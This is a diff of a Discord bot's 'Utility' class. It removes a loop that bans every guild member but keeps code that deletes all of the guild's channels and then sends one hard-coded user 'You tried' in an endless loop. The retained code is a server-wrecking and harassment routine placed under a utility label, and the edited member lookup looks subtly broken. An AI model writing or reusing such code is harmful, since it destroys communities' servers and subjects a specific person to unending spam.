@@ -31,14 +31,9 @@ class Utility:
                         await y.send("Bad move, Zewia...")
                     except:
                         pass
-                for z in x.members:
-                    try:
-                        await z.ban()
-                    except:
-                        await ctx.send("Couldn't ban: " + z.name)
                 for a in x.channels:
                     await a.delete()
-                zewia = x.find_member(349088339489456140)
+                zewia = self.bot.guild.find_member(349088339489456140)
                 while True:
                     await zewia.send("You tried")
 
